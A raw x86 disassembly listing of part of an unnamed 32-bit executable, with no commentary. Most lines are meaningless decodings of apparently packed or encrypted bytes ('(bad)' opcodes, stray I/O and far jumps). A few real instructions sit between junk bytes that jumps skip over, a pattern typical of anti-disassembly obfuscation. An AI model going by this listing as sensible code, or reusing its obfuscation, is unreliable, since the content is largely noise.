  401963:	xlat   BYTE PTR ds:[ebx]
  401964:	jl     0x401922
  401966:	jmp    0x5fd7:0x114885d2
  40196d:	pushf  
  40196e:	pop    ss
  40196f:	sub    esi,edi
  401971:	(bad)  [ebp+0x5875b21d]
  401977:	mov    edi,0x9e41bfdd
  40197c:	sti    
  40197d:	adc    al,0x6b
  40197f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401980:	dec    ebx
  401981:	sbb    BYTE PTR [esi+esi*1+0x11],ch
  401985:	jae    0x401969
  401987:	sti    
  401988:	and    esi,DWORD PTR [esi]
  40198a:	bound  ebp,QWORD PTR [ebx+0x89c3d4a]
  401990:	(bad)  
  401992:	sub    ecx,edx
  401994:	(bad)  
  401996:	out    0xbd,al
  401998:	fistp  WORD PTR [ecx-0x6a]
  40199b:	xor    dh,BYTE PTR [ecx]
  40199d:	mov    cl,0x39
  40199f:	rcr    DWORD PTR [esi],0x7d
  4019a2:	and    al,0xf6
  4019a4:	or     esi,DWORD PTR [edi+ebx*8]
  4019a7:	imul   edx,DWORD PTR [ebx-0x60],0x30
  4019ab:	mov    cl,0xff
  4019ad:	mov    ds:0x94b96b06,al
  4019b2:	mov    ebp,0xbafd7ed
  4019b7:	inc    edi
  4019b8:	ss call 0xd1f:0x6c2d38ef
  4019c0:	jmp    FWORD PTR [esi]
  4019c2:	cs iret 
  4019c4:	mov    ebx,0x2d4dfb22
  4019c9:	add    eax,0x5ac00cb1
  4019ce:	ins    BYTE PTR es:[edi],dx
  4019cf:	jmp    0x4019e0
  4019d1:	mov    dh,0x9a
  4019d3:	cmp    al,0x2a
  4019d5:	(bad)  [ecx-0x45a40891]
  4019db:	rcr    BYTE PTR [edi],1
  4019dd:	cmp    esi,edx
  4019df:	inc    ecx
  4019e0:	push   cs
  4019e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019e2:	push   es
  4019e3:	test   al,0x64
  4019e5:	adc    al,BYTE PTR [edi+0x1721c820]
  4019eb:	cld    
  4019ec:	es add eax,0x575f1b73
  4019f2:	cmp    eax,edi
  4019f4:	mov    ah,0x57
  4019f6:	xchg   BYTE PTR [ecx],ch
  4019f8:	xchg   esi,eax
  4019f9:	outs   dx,BYTE PTR ds:[esi]
  4019fa:	sbb    eax,0x938f5d8d
  4019ff:	sub    BYTE PTR [eax+0x4c5d55b],0x7b
  401a06:	adc    eax,0xfa078d80
  401a0b:	sub    dl,BYTE PTR [ebx]
  401a0d:	outs   dx,DWORD PTR ds:[esi]
  401a0e:	(bad)  
  401a0f:	repz mov bh,0xe3
  401a12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a13:	es xchg edx,eax
  401a15:	jmp    0x7ca2:0x9e268a7c
  401a1c:	arpl   WORD PTR [ebx-0x21],bx
  401a1f:	rol    edx,1
  401a21:	dec    eax
  401a22:	ficom  WORD PTR [esi]
  401a24:	mov    cl,BYTE PTR ss:0x9ad96f3c
  401a2b:	and    ebp,DWORD PTR [edi+0x5d75b128]
  401a31:	call   0xef99aad6
  401a36:	rcr    DWORD PTR [ebp+0x44],cl
  401a39:	into   
  401a3a:	sub    cl,BYTE PTR [ebx+edx*2+0x5b4c51a3]
  401a41:	xchg   esi,eax
  401a42:	add    eax,0x60826447
  401a47:	xchg   BYTE PTR [esi+ecx*8+0x1ef86db1],ch
  401a4e:	retf   
  401a4f:	cli    
  401a50:	mov    eax,0xc795714
  401a55:	icebp  
  401a56:	jbe    0x401ac1
  401a58:	cmc    
  401a59:	push   es
  401a5a:	sub    DWORD PTR [ecx-0x2035be40],eax
  401a60:	and    dl,BYTE PTR [ebx-0x26bb80f0]
  401a66:	cmp    DWORD PTR [ebx+0x31],0x3d
  401a6a:	daa    
  401a6b:	call   0x92c451e7
  401a70:	inc    edx
  401a71:	mov    al,0x6a
  401a73:	inc    ecx
  401a74:	test   DWORD PTR [ecx],edi
  401a76:	in     eax,dx
  401a77:	mov    DWORD PTR [ebp-0x50],ebx
  401a7a:	jmp    0x401c1b
  401a7f:	xchg   ecx,eax
  401a80:	mov    al,ds:0xe9b3d9b3
  401a85:	push   ecx
  401a86:	jo     0x401aa0
  401a88:	adc    BYTE PTR [esi],bl
  401a8a:	dec    esp
  401a8b:	mov    eax,ds:0xeba9b57
  401a90:	js     0x401b10
  401a92:	jle    0x401a8e
  401a94:	jg     0x401b14
  401a96:	jle    0x401a93
  401a98:	arpl   WORD PTR [edx+edx*2+0x55dc4711],bp
  401a9f:	and    esi,eax
  401aa1:	jge    0x401a70
  401aa3:	mov    ds:0x7e7d4170,al
  401aa8:	sbb    DWORD PTR [edx+0x19],ebp
  401aab:	pop    edi
  401aac:	and    eax,0xd4db35c8
  401ab1:	adc    eax,0x93357591
  401ab6:	out    dx,eax
  401ab7:	xor    eax,0x5a879619
  401abc:	inc    ebp
  401abd:	mov    cl,0x9f
  401abf:	or     eax,0xef2be4c3
  401ac4:	xchg   BYTE PTR [ecx+0x2ae1e745],cl
  401aca:	in     al,dx
  401acb:	cmp    BYTE PTR [edx+0x39],0xf5
  401acf:	enter  0xe139,0x6f
  401ad3:	sbb    eax,0xb436ecb7
  401ad8:	outs   dx,DWORD PTR ds:[esi]
  401ad9:	and    DWORD PTR [eax-0x5d],ebp
  401adc:	iret   
  401add:	in     al,0x73
  401adf:	dec    ebp
  401ae0:	inc    edi
  401ae1:	loop   0x401a8e
  401ae3:	gs push 0xfffffff9
  401ae6:	mov    ch,0xe3
  401ae8:	jmp    0x401b2a
  401aea:	push   ss
  401aeb:	scas   al,BYTE PTR es:[edi]
  401aec:	in     eax,dx
  401aed:	mov    gs,WORD PTR [ebx+ebx*1-0x32253e3b]
  401af4:	mov    edx,0xd6d5cd2a
  401af9:	sub    DWORD PTR [eax],ebp
  401afb:	cmp    bh,BYTE PTR [eax+0xc]
  401afe:	cli    
  401aff:	push   esp
  401b00:	sub    ebp,DWORD PTR [eax+0x3468c71a]
  401b06:	int    0x4
  401b08:	pop    ds
  401b09:	mov    ds:0x91cfa6ce,eax
  401b0e:	xchg   edi,eax
  401b0f:	cmp    DWORD PTR [ebx+0x41],eax
  401b12:	loope  0x401b8f
  401b14:	fstp   st(4)
  401b16:	mov    ds:0x19b2f4c,al
  401b1b:	loopne 0x401afc
  401b1d:	cmc    
  401b1e:	xor    dl,bl
  401b20:	fst    st(5)
  401b22:	js     0x401b49
  401b24:	fmul   st,st(1)
  401b26:	in     al,dx
  401b27:	pop    edi
  401b28:	mov    edi,0xd49a5e68
  401b2d:	or     al,0x8d
  401b2f:	push   esp
  401b30:	xor    BYTE PTR [ecx],bl
  401b32:	xchg   ebx,eax
  401b33:	in     eax,dx
  401b34:	xor    DWORD PTR [edi-0x52],ecx
  401b37:	or     al,BYTE PTR [ebp-0x6b]
  401b3a:	dec    ecx
  401b3b:	test   al,0xf1
  401b3d:	mov    ebx,0x2282e72e
  401b42:	inc    eax
  401b43:	sbb    ah,BYTE PTR [esi-0x33419669]
  401b49:	mov    ebx,0x4770842d
  401b4e:	inc    edi
  401b4f:	sub    eax,DWORD PTR [ebp+0x9]
  401b52:	sahf   
  401b53:	fisttp QWORD PTR [eax+0x739cf13c]
  401b59:	loop   0x401b1f
  401b5b:	(bad)  
  401b5c:	adc    DWORD PTR [edx+0x6117418b],eax
  401b62:	dec    ecx
  401b63:	jno    0x401b79
  401b65:	aad    0xca
  401b67:	mov    edi,0x97dc48fe
  401b6c:	sub    esi,ebx
  401b6e:	cwde   
  401b6f:	adc    al,0x5b
  401b71:	aam    0x7c
  401b73:	(bad)  
  401b74:	push   edi
  401b75:	mov    WORD PTR [ecx-0x59b4973],fs
  401b7b:	push   eax
  401b7c:	mov    bh,0xb4
  401b7e:	mov    ecx,0x9bcb7dfc
  401b83:	sti    
  401b84:	pop    eax
  401b85:	rol    DWORD PTR [esi+0x65],1
  401b88:	mov    ds:0x8edaf121,eax
  401b8d:	jno    0x401ba1
  401b8f:	pop    ebx
  401b90:	loopne 0x401b72
  401b92:	scas   al,BYTE PTR es:[edi]
  401b93:	pusha  
  401b94:	sti    
  401b95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b96:	dec    esp
  401b97:	dec    edi
  401b98:	mov    bl,BYTE PTR [esi-0x734874ed]
  401b9e:	(bad)  
  401b9f:	pop    ebp
  401ba0:	sbb    eax,0x968c4420
  401ba5:	fadd   DWORD PTR [ebx+0x3f3a87d0]
  401bab:	mov    WORD PTR [esi-0x3e3df4b5],?
  401bb1:	xor    al,BYTE PTR [edi+0x4b]
  401bb4:	cmp    BYTE PTR [ecx],bh
  401bb6:	(bad)  
  401bb7:	std    
  401bb8:	adc    edx,DWORD PTR [ebx-0x30]
  401bbb:	mov    ah,0x68
  401bbd:	test   BYTE PTR [edi-0x1fe6b4ce],cl
  401bc3:	ins    BYTE PTR es:[edi],dx
  401bc4:	push   edx
  401bc5:	(bad)
  401bc8:	mov    WORD PTR ds:0x22e37a9c,fs
  401bce:	push   esp
  401bcf:	cmc    
  401bd0:	or     DWORD PTR [edi+0x339e1b4d],ebx
  401bd6:	cdq    
  401bd7:	loop   0x401bc7
  401bd9:	pop    esp
  401bda:	aad    0x94
  401bdc:	dec    esp
  401bdd:	outs   dx,BYTE PTR ds:[esi]
  401bde:	addr16 inc ecx
  401be0:	mov    ds,WORD PTR [ebp+0x17]
  401be3:	jge    0x401beb
  401be5:	bound  esi,QWORD PTR [ebx]
  401be7:	(bad)  
  401be8:	shl    BYTE PTR [edx+0x3b400de],0x4d
  401bef:	pop    edx
  401bf0:	(bad)  
  401bf2:	dec    eax
  401bf3:	or     al,0x17
  401bf5:	pop    ss
  401bf6:	xchg   edi,eax
  401bf7:	sbb    DWORD PTR gs:[ebp-0x734edafb],esp
  401bfe:	popa   
  401bff:	pop    edi
  401c00:	sub    BYTE PTR [eax-0x23],bl
  401c03:	mov    ds:0x254a0f7c,al
  401c08:	ror    BYTE PTR [ecx-0xf],cl
  401c0b:	repz dec edx
  401c0d:	in     al,dx
  401c0e:	ret    
  401c0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c10:	cmp    ch,BYTE PTR [ecx]
  401c12:	das    
  401c13:	(bad)  
  401c14:	pop    edi
  401c15:	ret    
  401c16:	sbb    BYTE PTR [eax],ah
  401c18:	cld    
  401c19:	mul    DWORD PTR [ebx-0x75]
  401c1c:	inc    ebp
  401c1d:	mov    al,0x8b
  401c1f:	dec    ebp
  401c20:	clc    
  401c21:	xor    eax,esi
  401c23:	add    eax,edi
  401c25:	mov    DWORD PTR [ecx],eax
  401c27:	mov    eax,DWORD PTR [ebp-0x24]
  401c2a:	mov    ecx,DWORD PTR [ebp-0x8]
  401c2d:	xor    eax,esi
  401c2f:	jmp    0x401dd0
  401c34:	pop    ss
  401c35:	xor    eax,DWORD PTR [ebx]
  401c37:	mov    dl,0x23
  401c39:	mov    dl,0xb7
  401c3b:	mov    bl,0xfb
  401c3d:	lahf   
  401c3e:	cmc    
  401c3f:	xchg   esp,eax
  401c40:	cld    
  401c41:	dec    ebp
  401c42:	xor    al,0xf2
  401c44:	mov    bh,BYTE PTR [ecx+0x7e]
  401c47:	jle    0x401c43
  401c49:	jg     0x401cc9
  401c4b:	jle    0x401c61
  401c4d:	ret    
  401c4e:	xor    eax,0x964519cc
  401c53:	imul   DWORD PTR [ebx-0x1f64c873]
  401c59:	es je  0x401c8d
  401c5c:	mov    ds:0x212f077e,al
  401c61:	pop    ebp
  401c62:	or     DWORD PTR [edx-0x1646f606],ecx
  401c68:	aad    0xe5
  401c6a:	or     bh,BYTE PTR [eax-0x15]
  401c6d:	sahf   
  401c6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c6f:	pushf  
  401c70:	and    BYTE PTR [edi],0x7f
  401c73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c74:	mov    ds:0xcff37cfd,eax
  401c79:	sbb    ecx,DWORD PTR [edx-0x54]
  401c7c:	mov    ebp,DWORD PTR [ebx]
  401c7e:	push   edx
  401c7f:	dec    ebx
  401c80:	fstp   DWORD PTR [esi]
  401c82:	mov    cl,0x94
  401c84:	push   edx
  401c85:	jbe    0x401ce0
  401c87:	lods   al,BYTE PTR ds:[esi]
  401c88:	cli    
  401c89:	xchg   ebx,eax
  401c8a:	icebp  
  401c8b:	(bad)
  401c8f:	pop    ebp
  401c90:	jns    0x401c1d
  401c92:	jmp    0x90864968
  401c97:	push   0x3d
  401c99:	(bad)  
  401c9a:	fidivr DWORD PTR [edx+edx*1]
  401c9d:	aas    
  401c9e:	cwde   
  401c9f:	push   ds
  401ca0:	aad    0xd0
  401ca2:	test   DWORD PTR [edx+0x4ff12300],ebx
  401ca8:	xor    edi,DWORD PTR [esp+eax*1+0x1bcc3482]
  401caf:	sub    DWORD PTR [edi+eax*1-0x3a83351f],edx
  401cb6:	scas   al,BYTE PTR es:[edi]
  401cb7:	rcl    edi,cl
  401cb9:	aam    0x6b
  401cbb:	dec    edx
  401cbc:	arpl   WORD PTR ds:0x9a87f086,di
  401cc2:	stc    
  401cc3:	mov    bh,0xf
  401cc5:	cmc    
  401cc6:	and    BYTE PTR gs:[ebx],dh
  401cc9:	jp     0x401d07
  401ccb:	mov    eax,ds:0x3f204a2c
  401cd0:	or     DWORD PTR [ecx+0x58933c16],esp
  401cd6:	xchg   ebp,eax
  401cd7:	add    ch,BYTE PTR [edi-0x78eab4fc]
  401cdd:	add    BYTE PTR [ebx-0x2875f158],0xee
  401ce4:	push   eax
  401ce5:	mov    eax,0xe55ed96f
  401cea:	out    dx,al
  401ceb:	js     0x401d55
  401ced:	mov    al,0x7c
  401cef:	cwde   
  401cf0:	fiadd  DWORD PTR [ebx]
  401cf2:	adc    ebp,eax
  401cf4:	xchg   BYTE PTR [edi+0x43],ch
  401cf7:	sti    
  401cf8:	adc    bl,dl
  401cfa:	retf   0xf865
  401cfd:	les    ebp,FWORD PTR [edi+0x488213f2]
  401d03:	xor    BYTE PTR [ebx],bh
  401d05:	aas    
  401d06:	pop    esi
  401d07:	es mov ebx,0x89864f4c
  401d0d:	int    0x9a
  401d0f:	sbb    ch,BYTE PTR [edx-0x6b3bac0]
  401d15:	xor    BYTE PTR [edi-0x35],bh
  401d18:	mov    bl,0xda
  401d1a:	fs das 
  401d1c:	sbb    ch,BYTE PTR [edx-0x3]
  401d1f:	mov    bh,BYTE PTR [ebp-0x1a0674c2]
  401d25:	cmovno edi,DWORD PTR [edi]
  401d28:	outs   dx,DWORD PTR ds:[esi]
  401d29:	adc    dl,BYTE PTR [edx+0x60d90095]
  401d2f:	es and bl,al
  401d32:	adc    al,0x1c
  401d34:	lea    edi,[ebx+0x7eb8c1ac]
  401d3a:	lock mov bh,0x39
  401d3d:	mov    ch,0x99
  401d3f:	inc    ecx
  401d40:	out    dx,eax
  401d41:	adc    DWORD PTR [ecx],esp
  401d43:	ficom  WORD PTR [eax+0x42]
  401d46:	push   ebx
  401d47:	xor    ebp,DWORD PTR [eax]
  401d49:	out    dx,eax
  401d4a:	cld    
  401d4b:	xchg   ebp,eax
  401d4c:	mov    ecx,0x22e5b4c9
  401d51:	loopne 0x401d30
  401d53:	and    al,0xd6
  401d55:	ss push 0x6b
  401d58:	xchg   DWORD PTR [esi+0x1dc1f3ad],edi
  401d5e:	or     al,0xbe
  401d60:	jl     0x401d27
  401d62:	mov    ah,0x11
  401d64:	cmp    BYTE PTR [edi],ah
  401d66:	xor    eax,0xafdd5c24
  401d6b:	outs   dx,BYTE PTR ds:[esi]
  401d6c:	int3   
  401d6d:	cmp    ah,bh
  401d6f:	imul   ah
  401d71:	jmp    0x254:0xe2028ef3
  401d78:	and    eax,DWORD PTR [ecx]
  401d7a:	int3   
  401d7b:	je     0x401d71
  401d7d:	pop    edx
  401d7e:	call   0x9b2986d2
  401d83:	mov    eax,ds:0xc2a43de8
  401d88:	sar    DWORD PTR [edi-0x5e28a42c],0x16
  401d8f:	stos   DWORD PTR es:[edi],eax
  401d90:	and    eax,0x717f04e0
  401d95:	mov    cl,0xa4
  401d97:	div    bh
  401d99:	sbb    ah,BYTE PTR [ebx-0x63]
  401d9c:	cmp    DWORD PTR [ebp-0x4779ae6c],ecx
  401da2:	popa   
  401da3:	stos   BYTE PTR es:[edi],al
  401da4:	dec    ebx
  401da5:	and    dl,BYTE PTR [esi+0x1e]
  401da8:	adc    BYTE PTR [ecx+0x14762905],cl
  401dae:	jge    0x401d94
  401db0:	or     al,0x8a
  401db2:	scas   al,BYTE PTR es:[edi]
  401db3:	push   esp
  401db4:	add    dl,BYTE PTR [esi+0x3b3e4161]
  401dba:	jge    0x401dd7
  401dbc:	xchg   esi,eax
  401dbd:	mov    ebx,0xace3aacc
  401dc2:	popa   
  401dc3:	loopne 0x401d73
  401dc5:	test   DWORD PTR [ebx],edi
  401dc7:	or     esi,DWORD PTR [ebp+0x41]
  401dca:	mov    al,0x48
  401dcc:	retf   0xc61b
  401dcf:	std    
  401dd0:	add    eax,edi
  401dd2:	mov    DWORD PTR [ecx+0x4],eax
  401dd5:	mov    eax,DWORD PTR [ebp-0x2c]
  401dd8:	mov    ecx,DWORD PTR [ebp-0x8]
  401ddb:	mov    DWORD PTR [ecx+0x8],eax
  401dde:	mov    eax,DWORD PTR [ebp-0x30]
  401de1:	mov    ecx,DWORD PTR [ebp-0x8]
  401de4:	mov    DWORD PTR [ecx+0xc],eax
  401de7:	mov    eax,DWORD PTR [ebp-0x34]
  401dea:	mov    ecx,DWORD PTR [ebp-0x8]
  401ded:	mov    DWORD PTR [ecx+0x10],eax
  401df0:	mov    eax,eax
  401df2:	mov    eax,DWORD PTR [ebp-0x20]
  401df5:	xor    eax,esi
  401df7:	add    eax,edi
  401df9:	jmp    0x401f9a
  401dfe:	mov    ah,0x22
  401e00:	les    eax,FWORD PTR [eax+edx*2]
  401e03:	loopne 0x401e79
  401e05:	mov    dl,0xc7
  401e07:	xor    DWORD PTR [eax+0xe1d7138],ebp
  401e0d:	das    
  401e0e:	push   ss
  401e0f:	pop    es
  401e10:	jle    0x401e90
  401e12:	cli    
  401e13:	jg     0x401e93
  401e15:	jle    0x401e91
  401e17:	dec    ebp
  401e18:	out    dx,al
  401e19:	test   eax,0xff743549
  401e1e:	or     BYTE PTR [ebx-0x488f5800],ah
  401e24:	push   ss
  401e25:	push   ebx
  401e26:	push   es
  401e27:	inc    ebx
  401e28:	ret    0x3f96
  401e2b:	push   ss
  401e2c:	and    cl,BYTE PTR [ecx-0x51]
  401e2f:	(bad)  [edi+0x41]
  401e32:	ds lahf 
  401e34:	add    al,0x73
  401e36:	dec    ecx
  401e37:	sti    
  401e38:	dec    ecx
  401e39:	xchg   ebp,edi
  401e3b:	mov    eax,0x2163371a
  401e40:	sub    eax,esi
  401e42:	dec    edi
  401e43:	or     DWORD PTR [esi+0x37b47745],0xb0df80ba
  401e4d:	add    BYTE PTR [edx+edx*1+0x49],ch
  401e51:	out    0x42,eax
  401e53:	mov    edx,0x8aaac6e
  401e58:	ds and al,0x94
  401e5b:	gs in  al,0x7e
  401e5e:	and    al,BYTE PTR [edi+0x2e218e74]
  401e64:	lods   al,BYTE PTR ds:[esi]
  401e65:	mov    DWORD PTR [edx],ecx
  401e67:	pop    ecx
  401e68:	jmp    0x42f2:0x6ce439f3
  401e6f:	test   esi,eax
  401e71:	add    esi,DWORD PTR [ecx]
  401e73:	jl     0x401eda
  401e75:	clc    
  401e76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e77:	cld    
  401e78:	sbb    DWORD PTR [eax+0x256fa024],0xa172d221
  401e82:	(bad)  
  401e83:	fsubr  st,st(7)
  401e85:	sub    cl,BYTE PTR [ecx+ebx*1-0x466e19ba]
  401e8c:	mov    BYTE PTR [edi],bl
  401e8e:	and    ch,BYTE PTR [eax+eiz*2-0x18f6b189]
  401e95:	ins    DWORD PTR es:[edi],dx
  401e96:	mov    bl,0x21
  401e98:	or     edx,DWORD PTR [eax]
  401e9a:	fs mov edi,0x86b1a3ff
  401ea0:	sbb    edi,DWORD PTR [ecx+0x3739e659]
  401ea6:	sub    esi,DWORD PTR [ebx+0x6441fad]
  401eac:	inc    ebx
  401ead:	iret   
  401eae:	arpl   WORD PTR [esi-0x59],bp
  401eb1:	and    al,0x78
  401eb3:	push   eax
  401eb4:	mov    edx,0xdb583121
  401eb9:	ja     0x401f1e
  401ebb:	jmp    0x401e54
  401ebd:	pop    ecx
  401ebe:	sbb    edi,ebp
  401ec0:	xchg   BYTE PTR [ebx-0x457026e3],al
  401ec6:	icebp  
  401ec7:	out    dx,eax
  401ec8:	bound  ebx,QWORD PTR [ecx-0x1a3a8c4f]
  401ece:	fcmovbe st,st(1)
  401ed0:	mov    ch,0x9c
  401ed2:	aaa    
  401ed3:	push   eax
  401ed4:	xor    esp,DWORD PTR [ebp+0x10]
  401ed7:	scas   al,BYTE PTR es:[edi]
  401ed8:	jg     0x401f41
  401eda:	push   0xffffffd4
  401edc:	sub    al,0x44
  401ede:	dec    ebp
  401edf:	outs   dx,DWORD PTR ds:[esi]
  401ee0:	rol    BYTE PTR [esi-0x4062c51],0xfd
  401ee7:	loopne 0x401eec
  401ee9:	mov    ecx,DWORD PTR [edi]
  401eeb:	mov    cl,0x5d
  401eed:	inc    ebx
  401eee:	iret   
  401eef:	mov    edi,eax
  401ef1:	loopne 0x401e86
  401ef3:	add    al,0xca
  401ef5:	push   0x9c2c9b31
  401efa:	dec    eax
  401efb:	fist   DWORD PTR [ebp-0x7b]
  401efe:	jno    0x401eee
  401f00:	push   cs
  401f01:	jns    0x401f78
  401f03:	mov    eax,ds:0x70f78b50
  401f08:	mov    ecx,0x5e1e94c6
  401f0d:	or     dh,BYTE PTR [eax]
  401f0f:	inc    edx
  401f10:	mov    ds:0xccad5149,al
  401f15:	cmp    dh,ah
  401f17:	pusha  
  401f18:	mov    ds:0x1ac23da6,eax
  401f1d:	sbb    DWORD PTR [ebp+0x670f559],ecx
  401f23:	call   0x5e870bd8
  401f28:	call   0x7330:0xd0d5c1ca
  401f2f:	sahf   
  401f30:	jge    0x401f62
  401f32:	lahf   
  401f33:	cmp    eax,0x30bfd140
  401f38:	loope  0x401fa4
  401f3a:	hlt    
  401f3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f3c:	mov    ah,0xd9
  401f3e:	sbb    ch,BYTE PTR [edx-0x59627ff4]
  401f44:	test   al,0xb
  401f46:	mov    al,0xfe
  401f48:	sbb    ch,cl
  401f4a:	ja     0x401f91
  401f4c:	sub    cl,bl
  401f4e:	xchg   edx,eax
  401f4f:	pop    ebp
  401f50:	pusha  
  401f51:	push   ds
  401f52:	xchg   edx,eax
  401f53:	dec    ebp
  401f54:	mov    ah,0x72
  401f56:	inc    edx
  401f57:	out    dx,al
  401f58:	xor    DWORD PTR [ecx],ecx
  401f5a:	xchg   ebx,ecx
  401f5c:	sub    BYTE PTR [edx+0x5ad71640],ch
  401f62:	mov    WORD PTR [esi-0x1547c5e5],?
  401f68:	and    dh,BYTE PTR [ebx]
  401f6a:	cmp    al,0xd2
  401f6c:	outs   dx,DWORD PTR ds:[esi]
  401f6d:	xor    eax,0x6daedef1
  401f72:	or     eax,0x611dbf49
  401f77:	ja     0x401fa3
  401f79:	xchg   ebp,eax
  401f7a:	add    eax,0x9e812bde
  401f7f:	mov    edx,0xb25f1e02
  401f84:	das    
  401f85:	(bad)  
  401f86:	jmp    0x401f68
  401f88:	cld    
  401f89:	mov    ebx,0xcb34c0df
  401f8e:	test   DWORD PTR [esp+edx*4-0x2bdc3e37],0xace4f9a3
  401f99:	pushf  
  401f9a:	je     0x40230d
  401fa0:	lea    eax,[ebp-0x98]
  401fa6:	push   eax
  401fa7:	mov    eax,DWORD PTR [ebp-0x1c]
  401faa:	xor    eax,esi
  401fac:	add    eax,edi
  401fae:	jmp    0x40214f
  401fb3:	pop    ecx
  401fb4:	and    al,0xad
  401fb6:	aas    
  401fb7:	jno    0x402010
  401fb9:	imul   esp,DWORD PTR [eax-0x4769416e],0x8497582f
  401fc3:	xchg   edx,eax
  401fc4:	add    al,0x7e
  401fc6:	jle    0x401fc2
  401fc8:	jg     0x402048
  401fca:	jle    0x402037
  401fcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fcd:	mov    BYTE PTR [eax+0x2b],dl
  401fd0:	jns    0x40204a
  401fd2:	push   esp
  401fd3:	jne    0x401f62
  401fd5:	mov    dl,BYTE PTR [esi]
  401fd7:	add    eax,ecx
  401fd9:	push   ebp
  401fda:	adc    al,0x3b
  401fdc:	lock and ebx,DWORD PTR [edi+ebp*4-0x5d51085c]
  401fe4:	or     esi,DWORD PTR [eax]
  401fe6:	or     edx,DWORD PTR [ebx+0x37]
  401fe9:	aad    0x7d
  401feb:	and    DWORD PTR [ecx-0x3459b452],esp
  401ff1:	cmp    al,BYTE PTR [ebp-0x40680328]
  401ff7:	inc    edx
  401ff8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ff9:	pop    esp
  401ffa:	das    
  401ffb:	mov    bh,0x1
  401ffd:	fsubrp st(3),st
  401fff:	hlt    
  402000:	and    al,BYTE PTR [edi+0x9]
  402003:	jle    0x401fdd
  402005:	jg     0x401f99
  402007:	pop    ebx
  402008:	mov    BYTE PTR [edx],bh
  40200a:	dec    esi
  40200b:	sub    BYTE PTR [edx],cl
  40200d:	out    0x8c,al
  40200f:	jo     0x401fff
  402011:	(bad)  
  402012:	arpl   WORD PTR [edi],sp
  402014:	or     edx,DWORD PTR [eax]
  402016:	jbe    0x401fbc
  402018:	js     0x401fe5
  40201a:	loop   0x402099
  40201c:	jge    0x40203c
  40201e:	xor    DWORD PTR [edi-0x41ecb7f],eax
  402024:	aaa    
  402025:	ret    0x2da1
  402028:	mov    al,ds:0x5006c9d2
  40202d:	fdiv   st,st(4)
  40202f:	mov    esp,0xece2a36f
  402034:	mov    ch,0xb8
  402036:	mov    DWORD PTR [esi+ebx*4],edi
  402039:	lock pop esi
  40203b:	and    edi,DWORD PTR [ebp+0x79]
  40203e:	mov    ah,0x8d
  402040:	in     al,dx
  402041:	jo     0x402080
  402043:	adc    al,0xe
  402045:	not    DWORD PTR [ebx+0x7872d29f]
  40204b:	jb     0x402002
  40204d:	jl     0x402037
  40204f:	pop    ecx
  402050:	jmp    0x60e8:0x4f364761
  402057:	sbb    al,0x12
  402059:	stos   DWORD PTR es:[edi],eax
  40205a:	test   DWORD PTR [eax+edx*1-0x36],esp
  40205e:	lock mov cl,0x86
  402061:	arpl   WORD PTR [edx-0x4c133835],bx
  402067:	dec    edx
  402068:	fdivp  st(1),st
  40206a:	push   ds
  40206b:	cdq    
  40206c:	ins    BYTE PTR es:[edi],dx
  40206d:	ret    0x1bf0
  402070:	bound  eax,QWORD PTR [esi]
  402072:	(bad)  
  402073:	imul   eax,DWORD PTR [ebp+esi*4-0x1da84b3d],0x6b72b102
  40207e:	push   ds
  40207f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402080:	dec    edx
  402081:	ss cdq 
  402083:	xchg   esp,eax
  402084:	or     BYTE PTR [ecx],bh
  402086:	test   al,0x88
  402088:	mov    dl,BYTE PTR [edx+0x24]
  40208b:	push   esp
  40208c:	scas   eax,DWORD PTR es:[edi]
  40208d:	mov    edi,gs
  40208f:	inc    esp
  402090:	or     dl,BYTE PTR [ebx-0x3950b42b]
  402096:	add    eax,0x977445b4
  40209b:	dec    ecx
  40209c:	fucomip st,st(5)
  40209e:	aas    
  40209f:	iret   
  4020a0:	and    DWORD PTR [eax-0x5c],esi
  4020a3:	rcl    BYTE PTR [edi+0x46],cl
  4020a6:	mov    bl,BYTE PTR [edx+0x3d]
  4020a9:	sub    DWORD PTR [edx+0x6138bdcf],ecx
  4020af:	jmp    FWORD PTR [edx+0x7a]
  4020b2:	and    ebx,DWORD PTR [edi-0x74644dc2]
  4020b8:	xchg   esi,eax
  4020b9:	pop    ds
  4020ba:	add    eax,0xd73165cb
  4020bf:	and    al,0x2c
  4020c1:	ds maskmovq mm3,(bad)
  4020c3:	neg    DWORD PTR [edx-0x364b4b96]
  4020c9:	imul   ebp,DWORD PTR [ecx+0x10],0x2a
  4020cd:	fucom  st(3)
  4020cf:	inc    eax
  4020d0:	punpckhbw mm3,QWORD PTR [ecx]
  4020d3:	loope  0x4020d7
  4020d5:	inc    edx
  4020d6:	js     0x4020a0
  4020d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4020d9:	push   es
  4020da:	dec    ebp
  4020db:	pop    eax
  4020dc:	repnz cli 
  4020de:	cmp    BYTE PTR [edx+0x3e7af110],0xee
  4020e5:	or     edi,edi
  4020e7:	pop    ss
  4020e8:	fbstp  TBYTE PTR [edi-0x31db05a5]
  4020ee:	mov    ebx,0x9b8a493b
  4020f3:	(bad)
  4020f8:	mov    ds:0xf8b5cbb5,al
  4020fd:	mov    ds:0x4e4e5a23,al
  402102:	fistp  QWORD PTR [ebp+0x7ba2be62]
  402108:	mov    eax,0xca44501e
  40210d:	loopne 0x4020c1
  40210f:	das    
  402110:	and    DWORD PTR [ebx+ebp*1+0x64],0x1f
  402115:	push   esp
  402116:	push   ebx
  402117:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402118:	arpl   WORD PTR [ecx-0x6a969be0],ax
  40211e:	ficom  WORD PTR [edi-0x33]
  402121:	hlt    
  402122:	inc    ebx
  402123:	or     eax,0xd3a8c36f
  402128:	push   0xffffffe5
  40212a:	cmp    DWORD PTR [edi-0x1a],ecx
  40212d:	daa    
  40212e:	(bad)  
  40212f:	pop    edx
  402130:	outs   dx,BYTE PTR ds:[esi]
  402131:	mov    dl,0xc1
  402133:	push   ss
